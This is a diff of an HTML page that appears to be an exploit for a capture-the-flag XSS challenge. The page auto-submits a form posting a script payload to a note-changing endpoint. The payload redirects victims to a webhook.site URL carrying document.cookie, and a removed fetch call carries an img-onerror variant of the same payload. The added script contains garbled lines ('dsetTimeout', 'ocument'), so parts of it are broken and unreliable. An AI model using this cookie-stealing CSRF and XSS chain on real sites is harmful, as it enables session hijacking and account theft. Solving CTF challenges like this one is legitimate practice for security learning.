@@ -4,23 +4,24 @@
         <meta charset='utf-8'>
     </head>
     <body>
-        <!-- <form method="POST" id="myform" name="myform" action="https://tbdxss.chal.perfect.blue/change_note"> -->
-            <!-- <input type="text" name="data" value="<script>window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`</script>"></input> -->
-            <!-- <input type="submit"></submit> -->
-        <!-- </form> -->
+        <form method="POST" id="myform" name="myform" action="https://tbdxss.chal.perfect.blue/change_note">
+            <input type="text" name="data" value="<script>window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`</script>"></input>
+            <input type="submit"></submit>
+        </form>
         <script>
             
-            fetch("https://tbdxss.chal.perfect.blue/change_note", {
-                            method: "post",
-                            headers: {
-                                            "Content-Type": "multipart/form-data"
-                                        },
-                            data: {
-                                            "data":"<img src=x onerror='window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`'>"
-                                        }
-                        });
-            // document.myform.submit();
-            setTimeout(function(){ window.location = "https://tbdxss.chal.perfect.blue/note"; }, 2000);
+            // fetch("https://tbdxss.chal.perfect.blue/change_note", {
+            //                 method: "post",
+            //                 headers: {
+            //                                 "Content-Type": "multipart/form-data"
+            //                             },
+            //                 data: {
+            //                                 "data":"<img src=x onerror='window.location=`https://webhook.site/ca3953ff-ff57-486b-b6b6-8f54aea3f953?c=${document.cookie}`'>"
+            //                             }
+            //             });
+            window.open = "https://tbdxss.chal.perfect.blue/note";
+            dsetTimeout(function(){ ocument.myform.submit(); }, 1000);
+
             // window.location = "https://tbdxss.chal.perfect.blue/note";
         </script>
     </body>
